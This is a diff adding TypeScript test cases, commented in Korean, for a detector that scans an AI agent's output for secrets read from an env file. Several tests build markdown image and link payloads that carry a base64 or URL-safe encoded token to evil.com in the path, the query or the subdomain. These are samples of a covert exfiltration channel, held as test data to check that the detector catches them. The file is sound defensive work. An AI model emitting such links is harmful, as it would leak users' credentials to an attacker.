@@ -213,6 +213,50 @@ test("한계(정직): hex 인코딩은 미탐 (알파벳 변경 — 다음 단�
   assert.equal(scanOutputForSensitive(sp, { body: `data ${hex}` }, DET), null);
 });
 
+// ── ★ URL-safe base64(-_) + 표준+내부`/` 경로 (은닉 채널 후속 ①②) ─────────────
+// +/ 가 나오는 시크릿이라야 url-safe(-_)와 표준이 실제로 갈린다.
+const CONN = "conn://prod?tok=aB3+kk/mm99zz"; // std base64에 +/ 둘 다 포함
+const CONN_SP: SensitivePayload[] = [{ toolName: "read_env_file", payload: { conn: CONN } }];
+const stdB64 = Buffer.from(CONN, "utf8").toString("base64"); // Y29ubjovL3Byb2Q/dG9r...=
+const urlsafeB64 = stdB64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+
+test("★ ① url-safe base64 URL 경로: -_ 인코딩 시크릿 탐지", () => {
+  const f = scanOutputForSensitive(CONN_SP, { body: `![](https://evil.com/${urlsafeB64}.png)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ ① url-safe base64 쿼리·서브도메인도 탐지", () => {
+  assert.ok(scanOutputForSensitive(CONN_SP, { body: `[x](https://evil.com/r?d=${urlsafeB64})` }, DET));
+  assert.ok(scanOutputForSensitive(CONN_SP, { body: `![](https://${urlsafeB64}.evil.com/p.png)` }, DET));
+});
+
+test("★ ② 표준 base64(내부 /)를 URL 경로에: 리딩 host 병합 우회로 탐지", () => {
+  // host 라벨이 `com/<b64>`로 병합돼 앞이 쓰레기가 되는 케이스 — 오프셋 재시도로 잡는다.
+  const f = scanOutputForSensitive(CONN_SP, { body: `![](https://evil.com/${stdB64}.png)` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("회귀: 표준 base64 쿼리(?d=)는 여전히 탐지 (내부 / 있어도)", () => {
+  assert.ok(scanOutputForSensitive(CONN_SP, { body: `[x](https://evil.com/r?d=${stdB64})` }, DET));
+});
+
+test("★ 과차단 0: snake_case·kebab-case·혼합 식별자는 미발동 (정준성 게이트)", () => {
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "const some_long_variable_name_here = getInternalStateValue();" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: `<div class="nav-bar-primary-container-wide-layout-v2-rounded">` }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "feature_flag-new_checkout-flow_v3_enabled_by_default = true" }, DET), null);
+});
+
+test("★ 과차단 0: UUID·긴 URL 경로·docker ref는 미발동 (오프셋/url-safe 확장 후에도)", () => {
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "trace 550e8400-e29b-41d4-a716-446655440000 id" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "GET https://cdn.example.com/assets/js/vendor/react/dist/bundle.min.js" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { body: "docker pull registry.example.io/myorg/myimage-backend/service:v1.2.3-alpha" }, DET), null);
+});
+
+test("★ 회귀: JWT(base64url 헤더)·npm integrity 정상값은 여전히 미발동", () => {
+  assert.equal(scanOutputForSensitive(CONN_SP, { authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N" }, DET), null);
+  assert.equal(scanOutputForSensitive(CONN_SP, { integrity: "sha512-oPX8q3aB9cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6" }, DET), null);
+});
+
 // ── ★ 대용량(1MB) 세탁 탐지 유지 + 과차단 0 (성능 최적화 후 무손실 회귀 가드) ──────
 //    토큰화 dedup·needle-regex·concat-only 최적화가 대용량에서 탐지를 바꾸지 않음을 고정.
 const PAD = (n: number) => "the quick brown fox jumps over the lazy dog. 정상 로그. ".repeat(Math.ceil(n / 54)).slice(0, n);
